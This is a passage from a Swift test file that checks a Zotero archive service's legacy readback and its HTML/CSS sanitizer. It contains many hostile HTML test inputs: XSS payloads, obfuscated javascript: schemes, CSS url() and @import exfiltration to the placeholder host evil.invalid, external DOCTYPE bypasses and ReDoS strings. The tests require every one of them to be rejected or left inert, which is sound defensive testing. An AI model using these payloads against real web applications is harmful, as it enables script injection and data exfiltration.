            try require(credentials.loads==loads && backend.wireRequests.dropFirst(beforeCount).allSatisfy{$0.0=="GET"},"legacy readback performs only real metadata/file GETs without reading the saved credential")
            try require(try Data(contentsOf:file)==original && Data(contentsOf:summary)==summaryBytes,"successful legacy readback preserves every old journal and summary byte")
            let status=try await service.handle(command:"zotero.status",payload:[:],progress:{_ in})
            let row=(status["archives"] as! [[String:Any]]).first{$0["archiveID"] as? String==first.archiveID}
            try require(row?["accountBindingState"] as? String=="legacy-unbound" && row?["legacyReadOnlyEligible"] as? Bool==true,"legacy UI projection derives read-only eligibility without rewriting old summary")
            passed += 4
            for damage in ["membership","hash","missing-note","missing-file"] {
                let objects=backend.objects,files=backend.files
                switch damage {
                case "membership":var object=backend.objects[first.parentKey!]!;var data=object["data"] as! [String:Any];data["collections"]=[] as [String];object["data"]=data;backend.objects[first.parentKey!]=object
                case "hash":let key=first.steps.first{$0.role=="pdf"}!.key!;var object=backend.objects[key]!;var data=object["data"] as! [String:Any];data["md5"]=nil;object["data"]=data;backend.objects[key]=object
                case "missing-note":backend.objects[first.steps.first{$0.role=="note"}!.key!]=nil
                default:let key=first.steps.first{$0.role=="pdf"}!.key!;backend.files[key]=nil;try? FileManager.default.removeItem(at:backend.storage.appendingPathComponent(key))
                }
                let count=backend.wireRequests.count
                var rejected=false;do{_=try await service.archive(input,resumeID:first.archiveID)}catch{rejected=true}
                try require(rejected && backend.wireRequests.dropFirst(count).allSatisfy{$0.0=="GET"} && credentials.loads==loads && Data(contentsOf:file)==original && Data(contentsOf:summary)==summaryBytes,"legacy \(damage) cannot PATCH/create/upload or save a new green checkpoint")
                backend.objects=objects;backend.files=files
                passed += 1
            }
        }
        do {
            let (service,backend,credentials)=try fixture();backend.validGeneratedKeys=true;backend.failPDFUploadOnce=true
            let partial=try await service.archive(input)
            try require(partial.status=="partial","legacy partial fixture must originate in actual normal transfer failure")
            let file=root.appendingPathComponent("zotero-archives/"+partial.archiveID+".json"),summary=file.deletingPathExtension().appendingPathExtension("summary.json")
            var old=try JSONSerialization.jsonObject(with:Data(contentsOf:file)) as! [String:Any];old.removeValue(forKey:"personalLibraryBinding");try backend.data(old).write(to:file)
            let before=try Data(contentsOf:file),summaryBytes=try Data(contentsOf:summary),count=backend.wireRequests.count,loads=credentials.loads
            do{_=try await service.archive(input,resumeID:partial.archiveID);throw NSError(domain:"expected old partial rejection",code:1)}catch ZoteroService.ServiceError.legacyUnbound{}
            try require(backend.wireRequests.count==count && credentials.loads==loads && Data(contentsOf:file)==before && Data(contentsOf:summary)==summaryBytes,"unbound old partial refuses before even status/request/credential and preserves the original incomplete checkpoint")
            passed += 2
        }
        do {
            // E-H4: Scientific prose inside <pre> with "one = 0", "src = x", "url(...)" must pass,
            // while slash-separated event handlers, entity-obfuscated schemes, and @import CSS must fail.
            let (service, _, _) = try fixture()
            let guideFile = root.appendingPathComponent("e-h4-guide.html")
            try Data("<!doctype html><html><body><pre>one = 0; only = 1; src = x_1; url(https://arxiv.org/abs/2601.00001)</pre></body></html>".utf8).write(to: guideFile)
            var scientific = input
            scientific.guideHTMLPath = guideFile.path
            scientific.analysisHTML = "<pre>one = 0; only = 1; src = x_1; url(https://arxiv.org/abs/2601.00001)</pre>"
            let okResult = try await service.archive(scientific)
            try require(okResult.status == "complete", "E-H4: scientific prose inside <pre> passes Zotero HTML validation")
            for (idx, badHTML) in [
                "<!doctype html><html><body><svg/onload=alert(1)></svg></body></html>",
                "<!doctype html><html><body><a href=\"jav&#x61;script:alert(1)\">x</a></body></html>",
                "<!doctype html><html><head><style>@import \"https://evil.invalid/x.css\";</style></head><body>ok</body></html>",
                "<!doctype html><html><body><img src=\"data:text/html;base64,PHNjcmlwdD48L3NjcmlwdD4=\"></body></html>",
                "<!doctype html><html><body><!--><script>alert(1)</script><!----></body></html>",
                "<!doctype html><html><body><!-- --!><script>alert(1)</script><!-- --></body></html>",
                "<!doctype html><html><head><title><a title=\"</title><script>alert(1)</script>\"></title></head><body>ok</body></html>",
                "<!doctype html><html><head><style/>@import \"https://evil.invalid/x.css\";</style></head><body>ok</body></html>",
                "<!doctype html><html><head><style>@\\69mport \"https://evil.invalid/x.css\";</style></head><body>ok</body></html>",
                "<!doctype html><html><head><style>body{background:u\\72l(\"https://evil.invalid/leak.png\")}</style></head><body>ok</body></html>",
                "<!doctype html><html><head><style>body{background:u/**/rl(\"https://evil.invalid/leak.png\")}</style></head><body>ok</body></html>",
                "<!doctype html><html><body><img src=\"data:image/svg+xml;base64,%20PHN2Zy8+\"></body></html>",
                "<!doctype html><html><body><textarea><script>alert(1)</script></textarea></body></html>",
                "<!doctype html><html><body><div =\"><script>alert(1)</script>\"></div></body></html>",
                "<!doctype html><html><body><div class=\"x\" ='><script>alert(1)</script>'></div></body></html>",
                "<!doctype html><html><body><svg><style><script>alert(1)</script></style></svg></body></html>",
                "<!doctype html><html><body><svg><style/><script>alert(1)</script></style></svg></body></html>",
                "<!doctype html><html><body><math><style><div><script>alert(1)</script></div></style></math></body></html>",
                "<!doctype html><html><head><style><script>alert(1)</script></style></head><body>ok</body></html>",
                "<!doctype html><html><body><div style=\"background:url&lpar;https://evil.invalid/exfil.png&rpar;\">x</div></body></html>",
                "<!doctype html><html><body><div style=\"background:image-set&lpar;&quot;https://evil.invalid/x.png&quot; 1x&rpar;\">x</div></body></html>",
                "<!doctype html><html><body background=\"https://evil.invalid/leak.png\">ok</body></html>",
                "<!doctype html><html><body><svg><rect width=\"10\" height=\"10\" filter=\"url(https://evil.invalid/x.svg#f)\"/></svg></body></html>",
                "<!doctype html><html><body><a href=\"https://example.com\" ping=\"https://evil.invalid/track\">link</a></body></html>",
                "<!doctype html><html><body><img src=\"data:;image/png;base64,AA==\"></body></html>",
                "<!doctype html><html><body><img src=\"data:image/png;base64;extra=1,AA==\"></body></html>",
                "<!doctype html><html><body><div style=\"x:url&#xa0;('data:image/png;base64,AA==');background:url('https://evil.invalid/exfil.png\">x</div></body></html>",
                "<!doctype html><html><head><style>.d{content:\"url\u{00A0}('data:image/png;base64,AA==')\"}body{background:url(\"https://evil.invalid/exfil.png</style></head><body>ok</body></html>",
                "<!doctype html><html><body><svg / ><style>body{color:red}</style></svg></body></html>",
                "<!doctype html><html><body><math / ><style>body{color:red}</style></math></body></html>",
                "<!doctype html><html><body><svg></x:svg><style>body{color:red}</style></svg></body></html>",
                "<!doctype html><html><body><math></x:math><style>body{color:red}</style></math></body></html>",
                "<!doctype html><html><body></<a title=\"><script>alert(1)</script>\"></body></html>",
                "<!doctype html><html><body></<div data-x=\"><img src=https://evil.invalid/exfil.png onerror=alert(1)>\"></body></html>",
                "<!doctype html><html><body><svg></</svg><style>body{color:red}</style></svg></body></html>",
                "<!doctype html><html><body><svg><desc><div></svg></div></desc><style>body{color:red}</style></svg></body></html>",
                "<!doctype html><html><body><math><mtext><div></math></div></mtext><style>body{color:red}</style></math></body></html>",
                "<!doctype html><html><body><math><mi><div></math></div></mi><style>body{color:red}</style></math></body></html>",
                "<!doctype html><html><body><svg><desc><div></desc></svg></div></desc><style>body{color:red}</style></svg></body></html>",
                "<!doctype html><html><head><style>body{background:url(\"&#x64;ata:image/png;base64,AA==\")}</style></head><body>ok</body></html>",
                "<!doctype html><html><head><style>body{background:url(&quot;data:image/png;base64,AA==&quot;)}</style></head><body>ok</body></html>",
                "<!doctype html><html><body><div style=\"background:url(&quot;&amp;#x64;ata:image/png;base64,AA==&quot;)\">x</div></body></html>",
                "<!doctype html><html><body><img src=\"\u{00A0}data:image/png;base64,AA==\"></body></html>",
                "<!doctype html><html><head><style>body{background:url(\"\u{00A0}data:image/png;base64,AA==\")}</style></head><body>ok</body></html>",
                "<!doctype html><html><body><img src=\"data&colonimage/png;base64,AA==\"></body></html>",
                "<!doctype html><html><body><img src=\"data&#x26;colon;image/png;base64,AA==\"></body></html>",
                "<!doctype html><html><head><meta charset=\"iso-2022-jp\"></head><body><div a=\"\u{001B}$B!\"a='!\u{001B}(B\"><script>alert(1)</script>'></div></body></html>",
                "<!doctype html><html><head><meta charset=\"csISO2022JP\"></head><body>ok</body></html>",
                "<!doctype html><html><head><meta charset=\"iso-2022-&#x6a;p\"></head><body>ok</body></html>",
                "<!doctype html><html><body><div a=\"\u{001B}$B!\"a='!\u{001B}(B\">x</div></body></html>",
                "<!doctype html><html><body><img src=\"data:image/png;base64,AA==\" attributionsrc=\"https://evil.invalid/leak\"></body></html>",
                "<!doctype html><html><body><a href=\"https://example.com\" attributionsrc=\"https://evil.invalid/leak\">x</a></body></html>"
            ].enumerated() {
                let badFile = root.appendingPathComponent("e-h4-bad-\(idx).html")
                try Data(badHTML.utf8).write(to: badFile)
                var bad = input
                bad.guideHTMLPath = badFile.path
                var rejected = false
                do { _ = try await service.archive(bad) } catch { rejected = true }
                try require(rejected, "E-H4: Zotero HTML validator rejects active payload: \(badHTML)")
            }
            for (idx, redosHTML) in [
                "<!doctype html><html><head><style>body{background:url(\(String(repeating: " ", count: 10_000))}</style></head><body>ok</body></html>",
                "<!doctype html><html><body><div style=\"background:url(\(String(repeating: " ", count: 10_000))\">x</div></body></html>",
                "<!doctype html><html><head><style>body{background:\(String(repeating: "url(a ", count: 5_000))}</style></head><body>ok</body></html>"
            ].enumerated() {
                let redosFile = root.appendingPathComponent("e-h4-redos-\(idx).html")
                try Data(redosHTML.utf8).write(to: redosFile)
                var bad = input
                bad.guideHTMLPath = redosFile.path
                let start = Date()
                var rejected = false
                do { _ = try await service.archive(bad) } catch { rejected = true }
                let elapsed = Date().timeIntervalSince(start)
                try require(rejected, "E-H4: Zotero CSS url() ReDoS payload \(idx) must be rejected")
                try require(elapsed < 1.0, "E-H4: Zotero CSS url() validation must remain linear (elapsed=\(elapsed)s)")
            }
            let utf8MetaFile = root.appendingPathComponent("e-h4-utf8-meta-ok.html")
            let validCssAndSvgHTML = """
            <!doctype html><html><head><meta charset="utf-8"><style>
            .a{background:url("data:image/png;base64,AA==")}
            .b{src:url('data:font/woff2;base64,AA==')}
            .c{background:url( data:image/png;base64,AA== )}
            .d{background:url("data:image/png;base64,AA\n==")}
            </style></head><body><p>ok</p></body></html>
            """
            try Data(validCssAndSvgHTML.utf8).write(to: utf8MetaFile)
            var okInput = input
            okInput.guideHTMLPath = utf8MetaFile.path
            _ = try await service.archive(okInput)
            // Linear-time O(n) regressions for many valid CSS url()s + entity-heavy inline SVG data URI
            let manyUrlsFile = root.appendingPathComponent("e-h4-many-urls-linear.html")
            let manyUrlsCSS = String(repeating: ".x{background:url(data:image/png;base64,AA==)}", count: 4_000)
                + String(repeating: ".pad{color:red}", count: 20_000)
            try Data("<!doctype html><html><head><style>\(manyUrlsCSS)</style></head><body>ok</body></html>".utf8).write(to: manyUrlsFile)
            var manyUrlsInput = input
            manyUrlsInput.guideHTMLPath = manyUrlsFile.path
            let manyUrlsStart = Date()
            _ = try await service.archive(manyUrlsInput)
            try require(Date().timeIntervalSince(manyUrlsStart) < 2.0, "E-H4: validateZoteroCSS must remain linear for many valid url() entries")
            let entityHeavySVG = "<svg xmlns=\"http://www.w3.org/2000/svg\"><text>\(String(repeating: "&#x41;&#66;&amp;", count: 8_000))</text></svg>"
            let entityHeavyFile = root.appendingPathComponent("e-h4-entity-svg-linear.html")
            let entityHeavyB64 = Data(entityHeavySVG.utf8).base64EncodedString()
            try Data("<!doctype html><html><body><img src=\"data:image/svg+xml;base64,\(entityHeavyB64)\"></body></html>".utf8).write(to: entityHeavyFile)
            var entityHeavyInput = input
            entityHeavyInput.guideHTMLPath = entityHeavyFile.path
            let entityStart = Date()
            _ = try await service.archive(entityHeavyInput)
            try require(Date().timeIntervalSince(entityStart) < 2.0, "E-H4: decodeHTMLEntities on inline SVG must remain linear")
            // Non-BMP / UTF-16 surrogate-pair safety across validateZoteroCSS and decodeHTMLEntities
            let nonBmpGoodFile = root.appendingPathComponent("e-h4-nonbmp-ok.html")
            let nonBmpSvg = "<svg xmlns=\"http://www.w3.org/2000/svg\"><text>😀&#x1F680;&#128293;&amp;🎉</text></svg>"
            let nonBmpSvgB64 = Data(nonBmpSvg.utf8).base64EncodedString()
            let nonBmpGoodHTML = "<!doctype html><html><head><style>.a{content:\"😀🔥\";background:url(\"data:image/png;base64,AA==\")} .b{content:\"🎉\";background:url('data:image/svg+xml;base64,\(nonBmpSvgB64)')}</style></head><body><img src=\"data:image/svg+xml;base64,\(nonBmpSvgB64)\"></body></html>"
            try Data(nonBmpGoodHTML.utf8).write(to: nonBmpGoodFile)
            var nonBmpGoodInput = input; nonBmpGoodInput.guideHTMLPath = nonBmpGoodFile.path
            _ = try await service.archive(nonBmpGoodInput)
            let nonBmpBadCssFile = root.appendingPathComponent("e-h4-nonbmp-bad-css.html")
            let nonBmpBadCssHTML = "<!doctype html><html><head><style>.a{content:\"😀🔥\";background:url(\"data:image/png;base64,AA==\")} .b{background:url(https://evil.invalid/x.png)}</style></head><body>ok</body></html>"
            try Data(nonBmpBadCssHTML.utf8).write(to: nonBmpBadCssFile)
            var nonBmpBadCssInput = input; nonBmpBadCssInput.guideHTMLPath = nonBmpBadCssFile.path
            var rejectedNonBmpCss = false
            do { _ = try await service.archive(nonBmpBadCssInput) } catch { rejectedNonBmpCss = true }
            try require(rejectedNonBmpCss, "E-H4: malicious url() after non-BMP prefix must still be rejected")
            for badSvgEntity in ["&#xD800;", "&#x110000;", "&#0;"] {
                let badSvg = "<svg xmlns=\"http://www.w3.org/2000/svg\"><text>😀\(badSvgEntity)</text></svg>"
                let badSvgFile = root.appendingPathComponent("e-h4-nonbmp-bad-ent-\(badSvgEntity.count).html")
                try Data("<!doctype html><html><body><img src=\"data:image/svg+xml;base64,\(Data(badSvg.utf8).base64EncodedString())\"></body></html>".utf8).write(to: badSvgFile)
                var badSvgInput = input; badSvgInput.guideHTMLPath = badSvgFile.path
                var rejectedSvg = false
                do { _ = try await service.archive(badSvgInput) } catch { rejectedSvg = true }
                try require(rejectedSvg, "E-H4: invalid numeric entity \(badSvgEntity) after non-BMP prefix must be rejected")
            }
            // Linear-time O(n) regressions for LibraryService.rewriteHTML5TagsForTidy & htmlDocumentPreservingMath
            for (label, payload) in [
                ("unclosed-tags", String(repeating: "<a ", count: 50_000)),
                ("unclosed-quote", String(repeating: "<a ", count: 50_000) + "\">"),
                ("rawtext-false-prefix", "<script>" + String(repeating: "</scriptx ", count: 40_000) + "</script>"),
                ("rawtext-unclosed", "<script>" + String(repeating: "</script ", count: 40_000))
            ] {
                let t0 = Date()
                _ = LibraryService.rewriteHTML5TagsForTidy(payload, tagMarker: "data-m", preserveTags: ["figure"], containerTags: ["section"])
                let dt = Date().timeIntervalSince(t0)
                try require(dt < 1.0, "Wave 6 R8: rewriteHTML5TagsForTidy \(label) must be O(n) (elapsed=\(dt)s)")
            }
            let mathChunk = "<script>" + String(repeating: "</scriptx ", count: 5_000) + "</script>"
            let mathRawTextHTML = "<!doctype html><html><body>" + String(repeating: mathChunk, count: 16) + "<p>ok</p></body></html>"
            let tMath = Date()
            _ = try LibraryService.htmlDocumentPreservingMath(mathRawTextHTML)
            let dtMath = Date().timeIntervalSince(tMath)
            try require(dtMath < 1.0, "Wave 6 R8: htmlDocumentPreservingMath raw-text scan must be O(n) (elapsed=\(dtMath)s)")
            // Wave 6 R9: HTML5 attribute/end-tag/bogus-PI/bogus-end/self-closing rawtext parity & anti-breakout regressions
            for (label, prefix) in [
                ("unquoted-attr-quote", "<div a=1\"></div>"),
                ("attr-name-quote", "<div \"></div>"),
                ("rawtext-end-quote", "<script></script \"></script>"),
                ("bogus-pi-quote", "<?a \">"),
                ("tag-bang-attr", "<a!b title=\"><figure>IN</figure>\">")
            ] {
                let payload = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\">\(prefix)<p title=\"><figure><div data-citation-record='{&quot;paperKey&quot;:&quot;arxiv:9999.99999&quot;}'></div><img src='https://evil.invalid/exfil.png'><a href='https://evil.invalid/phish'>CLICK</a><math><semantics><mi>x</mi><annotation encoding='application/x-tex'>SPOOFED</annotation></semantics></math>\">innocent</p></div></body></html>"
                let rewritten = LibraryService.rewriteHTML5TagsForTidy(payload, tagMarker: "data-m", preserveTags: ["figure", "figcaption"], containerTags: ["section", "article", "main"])
                try require(!rewritten.contains("data-m=\"figure\""), "Wave 6 R9: \(label) must not break out of title attribute to rewrite <figure>")
                let parsedDoc = try LibraryService.htmlDocumentPreservingMath(rewritten)
                let imgs = try parsedDoc.nodes(forXPath: "//img")
                let links = try parsedDoc.nodes(forXPath: "//a[@href]")
                let cits = try parsedDoc.nodes(forXPath: "//*[@data-citation-record]")
                let maths = try parsedDoc.nodes(forXPath: "//*[local-name()='math']")
                try require(imgs.isEmpty && links.isEmpty && cits.isEmpty && maths.isEmpty, "Wave 6 R9: \(label) must keep attribute text inert (imgs=\(imgs.count), links=\(links.count), cits=\(cits.count), maths=\(maths.count))")
            }
            // Bogus `<!foo ">`: rewriteHTML5TagsForTidy must not break out, and htmlDocumentPreservingMath must reject non-DOCTYPE `<!...>`
            let bogusBangPayload = "<!doctype html><html><body><!foo \"><p title=\"><figure>IN</figure>\">ok</p></body></html>"
            let bogusBangRewritten = LibraryService.rewriteHTML5TagsForTidy(bogusBangPayload, tagMarker: "data-m", preserveTags: ["figure"], containerTags: [])
            try require(!bogusBangRewritten.contains("data-m=\"figure\""), "Wave 6 R9: bogus-bang-quote must not break out of title attribute")
            var rejectedBogusBang = false
            do { _ = try LibraryService.htmlDocumentPreservingMath(bogusBangRewritten) } catch { rejectedBogusBang = true }
            try require(rejectedBogusBang, "Wave 6 R9: htmlDocumentPreservingMath must reject bogus <!foo \"> declaration")
            // Space-before-slash and unquoted-URL-slash must NOT self-close rawtext elements
            for rawKeep in [
                "<style / ><figure>IN_STYLE</figure></style>",
                "<style src=https://example.com/><figure>IN_STYLE</figure></style>",
                "<script / ><figure>IN_SCRIPT</figure></script>"
            ] {
                let rw = LibraryService.rewriteHTML5TagsForTidy(rawKeep, tagMarker: "data-m", preserveTags: ["figure"], containerTags: [])
                try require(!rw.contains("data-m=\"figure\""), "Wave 6 R9: raw-text element must not be self-closed by \(rawKeep)")
            }
            // Ordinary prose with '<0.05' must not crash or drop MathML
            for proseMath in [
                "<!doctype html><html><body><div id=\"article-body\"><p>When p <0.05 we get <math><mi>x</mi></math>.</p></div></body></html>",
                "<!doctype html><html><body><div id=\"article-body\"><p>If p <0.05 we don't drop <math><mi>x</mi></math> when it's true.</p></div></body></html>"
            ] {
                let docProse = try LibraryService.htmlDocumentPreservingMath(proseMath)
                let maths = try docProse.nodes(forXPath: "//*[local-name()='math']")
                try require(maths.count == 1, "Wave 6 R9: '<0.05' prose must preserve MathML cleanly (got \(maths.count))")
            }
            // Unquoted quote, self-closing <style/>, bogus end-tag </<a, and bogus PI <?a "> must NOT bypass external DOCTYPE rejection
            for bypassDoctype in [
                "<!doctype html><html><body><div a=1'></div><!DOCTYPE html SYSTEM \"https://evil.invalid/ext.dtd\"><math><mi>X</mi></math><p>it's ok</p></body></html>",
                "<!doctype html><html><body><style/><!DOCTYPE html SYSTEM \"https://evil.invalid/ext.dtd\"><math><mi>X</mi></math><p>ok</p></body></html>",
                "<!doctype html><html><body><script/><!DOCTYPE html SYSTEM \"https://evil.invalid/ext.dtd\"><p>ok</p></body></html>",
                "<!doctype html><html><body></<a title=\"><!DOCTYPE html SYSTEM 'https://evil.invalid/ext.dtd'><figure><p>FIG</p></figure><math><mi>X</mi></math>\">ok</body></html>",
                "<!doctype html><html><body><?a \"><!DOCTYPE html SYSTEM 'https://evil.invalid/ext.dtd'><p>ok</p>\"?></body></html>"
            ] {
                var rejectedDoctype = false
                do { _ = try LibraryService.htmlDocumentPreservingMath(bypassDoctype) } catch { rejectedDoctype = true }
                try require(rejectedDoctype, "Wave 6 R9: external DOCTYPE bypass must be rejected for \(bypassDoctype)")
            }
            // Bogus end-tag </<a must allow rewriteHTML5TagsForTidy & htmlDocumentPreservingMath to still see live <figure> and <math>
            let bogusEndLive = "<!doctype html><html><body></<a title=\"><figure><p>FIG</p></figure><math><mi>x</mi></math>\">ok</body></html>"
            let rwBogus = LibraryService.rewriteHTML5TagsForTidy(bogusEndLive, tagMarker: "data-m", preserveTags: ["figure"], containerTags: [])
            try require(rwBogus.contains("data-m=\"figure\""), "Wave 6 R9: bogus end-tag </<a must close at first '>' so live <figure> is preserved")
            let docBogus = try LibraryService.htmlDocumentPreservingMath(rwBogus)
            try require((try docBogus.nodes(forXPath: "//*[local-name()='math']")).count == 1, "Wave 6 R9: bogus end-tag </<a must preserve live <math>")
            // Direct verifySafeDesktopArticleHTML coverage for containsInvalidNumericEntity after non-BMP prefix
            var rejectedDirectEnt = false
            do { try LibraryService.verifySafeDesktopArticleHTML("<p>😀&#xD800;</p>") } catch { rejectedDirectEnt = true }
            try require(rejectedDirectEnt, "Wave 6 R9: verifySafeDesktopArticleHTML must reject invalid numeric entity after non-BMP surrogate pair")

            // Wave 6 R10: libtidy parser-differential hardening across all 5 classes
            // 1. Bogus end-tags (`</ `, `</1`, `</! `, `</<a `) must not swallow following live `<p title="...">`
            for (label, prefix) in [
                ("end-space", "</ "),
                ("end-digit", "</1"),
                ("end-bang", "</! "),
                ("end-lt-lt", "</<a "),
                ("eq-eq", "<div ==\"x>"),
                ("attr-lt", "<div a<b=\"x>"),
                ("unq-lt", "<div a=b"),
                ("dquote-eq", "<div \"=\"x>"),
                ("ctrl-vt-quote", "<p data-k=1></p><div\u{0c}title=\"x>"),
                ("ctrl-soh-script", "<scr\u{01}ipt><a title=\"</script>")
            ] {
                let payload = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\">\(prefix)<p title=\"><figure><div data-citation-record='{&quot;paperKey&quot;:&quot;arxiv:9999.99999&quot;}'></div><img src='https://evil.invalid/exfil.png'><a href='https://evil.invalid/phish'>CLICK</a><math><semantics><mi>x</mi><annotation encoding='application/x-tex'>SPOOFED</annotation></semantics></math></figure>\">innocent</p></div></body></html>"
                let rewritten = LibraryService.rewriteHTML5TagsForTidy(payload, tagMarker: "data-m", preserveTags: ["figure", "figcaption"], containerTags: ["section", "article", "main"])
                try require(!rewritten.contains("data-m=\"figure\""), "Wave 6 R10: \(label) must not break out of title attribute to rewrite <figure>")
                let parsedDoc = try LibraryService.htmlDocumentPreservingMath(rewritten)
                let imgs = try parsedDoc.nodes(forXPath: "//img")
                let links = try parsedDoc.nodes(forXPath: "//a[@href]")
                let cits = try parsedDoc.nodes(forXPath: "//*[@data-citation-record]")
                let maths = try parsedDoc.nodes(forXPath: "//*[local-name()='math']")
                try require(imgs.isEmpty && links.isEmpty && cits.isEmpty && maths.isEmpty, "Wave 6 R10: \(label) must keep attribute text inert (imgs=\(imgs.count), links=\(links.count), cits=\(cits.count), maths=\(maths.count))")
            }
            // Control byte directly before quoted value (`<p title=\u{0b}">...`, `<p title=\u{01}">...`)
            for (label, ctrl) in [("ctrl-vt-val", "\u{0b}"), ("ctrl-soh-val", "\u{01}")] {
                let payload = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><p title=\(ctrl)\"><figure><img src='https://evil.invalid/exfil.png'><math><mi>x</mi></math></figure>\">innocent</p></div></body></html>"
                let rewritten = LibraryService.rewriteHTML5TagsForTidy(payload, tagMarker: "data-m", preserveTags: ["figure"], containerTags: [])
                try require(!rewritten.contains("data-m=\"figure\""), "Wave 6 R10: \(label) must strip control char and keep <figure> inert")
                let parsedDoc = try LibraryService.htmlDocumentPreservingMath(rewritten)
                try require((try parsedDoc.nodes(forXPath: "//img")).isEmpty && (try parsedDoc.nodes(forXPath: "//*[local-name()='math']")).isEmpty, "Wave 6 R10: \(label) must produce zero live imgs/math")
            }
            // PHP / ASP / JSTE / SGML marked section: rewriteHTML5TagsForTidy must stay synced, htmlDocumentPreservingMath must fail closed
            for (label, prefix) in [
                ("php", "<?php > <a title=\" ?> "),
                ("asp", "<% <a title=\" %> "),
                ("jste", "<# <a title=\" #> "),
                ("marked-sec", "<![foo[ > <a title=\" ]]> ")
            ] {
                let payload = "<!doctype html><html><body>\(prefix)<p title=\"><figure>IN</figure>\">innocent</p></body></html>"
                let rewritten = LibraryService.rewriteHTML5TagsForTidy(payload, tagMarker: "data-m", preserveTags: ["figure"], containerTags: [])
                try require(!rewritten.contains("data-m=\"figure\""), "Wave 6 R10: \(label) must not break out of title attribute")
                var rejected = false
                do { _ = try LibraryService.htmlDocumentPreservingMath(rewritten) } catch { rejected = true }
                try require(rejected, "Wave 6 R10: htmlDocumentPreservingMath must reject \(label)")
            }
            // XML declaration must be rejected so Foundation never bypasses libtidy into XML mode
            do {
                var rejectedXML = false
                do { _ = try LibraryService.htmlDocumentPreservingMath("<?xml version=\"1.0\"?><html><body><div id=\"article-body\" class=\"post-content\"><script><div data-citation-record='{\"paperKey\":\"arxiv:9999.99999\"}'/></script><p>ok</p></div></body></html>") } catch { rejectedXML = true }
                try require(rejectedXML, "Wave 6 R10: <?xml declaration must be rejected")
            }
            // Raw-text neutralization: tags inside textarea/title/xmp/iframe/noembed/noframes/plaintext/script/style remain inert,
            // while Hugo JSON citation script preserves its JSON safely
            for rawTag in ["textarea", "title", "xmp", "iframe", "noembed", "noframes"] {
                let payload = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><\(rawTag)><p><img src='https://evil.invalid/a.png'><math><mi>x</mi></math></p></\(rawTag)><p>ok</p></div></body></html>"
                let rw = LibraryService.rewriteHTML5TagsForTidy(payload, tagMarker: "data-m", preserveTags: ["figure"], containerTags: [])
                let doc = try LibraryService.htmlDocumentPreservingMath(rw)
                try require((try doc.nodes(forXPath: "//img")).isEmpty && (try doc.nodes(forXPath: "//*[local-name()='math']")).isEmpty, "Wave 6 R10: <\(rawTag)> inner HTML must remain inert")
            }
            for rawScriptStyle in [
                "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><script></foo><p>real</p><math><mi>x</mi></math></script><p>ok</p></div></body></html>",
                "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><style></foo><p>real</p><math><mi>x</mi></math></style><p>ok</p></div></body></html>",
                "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><script a/><p>in script</p><math><mi>x</mi></math></script><p>ok</p></div></body></html>",
                "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><script //><p>in script</p><math><mi>x</mi></math></script><p>ok</p></div></body></html>",
                "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><script src=\"https://example.com/a.js\"><p>in script</p><math><mi>x</mi></math></script><p>ok</p></div></body></html>",
                "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><server><p>in server</p><math><mi>x</mi></math></server><p>ok</p></div></body></html>",
                "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><plaintext><p>plain</p><math><mi>x</mi></math></div></body></html>"
            ] {
                let rw = LibraryService.rewriteHTML5TagsForTidy(rawScriptStyle, tagMarker: "data-m", preserveTags: ["figure"], containerTags: [])
                let doc = try LibraryService.htmlDocumentPreservingMath(rw)
                try require((try doc.nodes(forXPath: "//*[local-name()='math']")).isEmpty, "Wave 6 R10: raw-text/plaintext must stay inert in both scanner and libtidy for \(rawScriptStyle)")
            }
            // Hugo JSON citation script with '<' inside JSON string survives cleanly without HTML breakout
            do {
                let citHTML = "<!doctype html><html><body><div id=\"article-body\" class=\"post-content\"><script type=\"application/json\" class=\"paper-tools__citation-record\">{\"paperKey\":\"arxiv:2611.26409\",\"title\":\"a < b </foo> <img src=x>\"}</script><p>ok</p></div></body></html>"
                let rw = LibraryService.rewriteHTML5TagsForTidy(citHTML, tagMarker: "data-m", preserveTags: ["figure"], containerTags: [])
                let doc = try LibraryService.htmlDocumentPreservingMath(rw)
                try require((try doc.nodes(forXPath: "//img")).isEmpty, "Wave 6 R10: JSON citation script must never emit live <img>")
                let citNode = try doc.nodes(forXPath: "//script[@type='application/json' and contains(concat(' ', normalize-space(@class), ' '), ' paper-tools__citation-record ')]").first
                let decoded = try citNode?.stringValue?.data(using: .utf8).flatMap { try JSONSerialization.jsonObject(with: $0) as? [String: Any] }
                try require(decoded?["title"] as? String == "a < b </foo> <img src=x>", "Wave 6 R10: JSON citation script must round-trip '<' accurately via \\u003c")
            }
            // Global external DOCTYPE defense-in-depth rejects ALL R10 bypass vectors
            for bypassDoctype in [
                "<!doctype html><html><body></ <!DOCTYPE html SYSTEM 'https://evil.invalid/ext.dtd'><p>ok</p></body></html>",
                "<!doctype html><html><body><div ==\"x><!DOCTYPE html SYSTEM 'https://evil.invalid/ext.dtd'>\">ok</div></body></html>",
                "<!doctype html><html><body><div a<b=\"x><!DOCTYPE html SYSTEM 'https://evil.invalid/ext.dtd'>\">ok</div></body></html>",
                "<!doctype html><html><body><div a=b<!DOCTYPE html SYSTEM 'https://evil.invalid/ext.dtd'>>ok</div></body></html>",
                "<\u{01}!DOCTYPE html SYSTEM \"https://evil.invalid/ext.dtd\"><html><body><p>ok</p></body></html>",
                "<!doctype html><html><body><plaintext><!DOCTYPE html SYSTEM 'https://evil.invalid/ext.dtd'><p>ok</p></body></html>",
                "<!doctype html><html><body><textarea><!DOCTYPE html SYSTEM 'https://evil.invalid/ext.dtd'></textarea><p>ok</p></body></html>",
                "<!doctype html><html><body><script></foo><!DOCTYPE html SYSTEM 'https://evil.invalid/ext.dtd'></script><p>ok</p></body></html>",
                "<!doctype html><html><body><style x=foo/><!DOCTYPE html SYSTEM 'https://evil.invalid/ext.dtd'></style><p>ok</p></body></html>"
            ] {
                var rejected = false
                do { _ = try LibraryService.htmlDocumentPreservingMath(bypassDoctype) } catch { rejected = true }
                try require(rejected, "Wave 6 R10: external DOCTYPE bypass must be rejected for \(bypassDoctype)")
            }
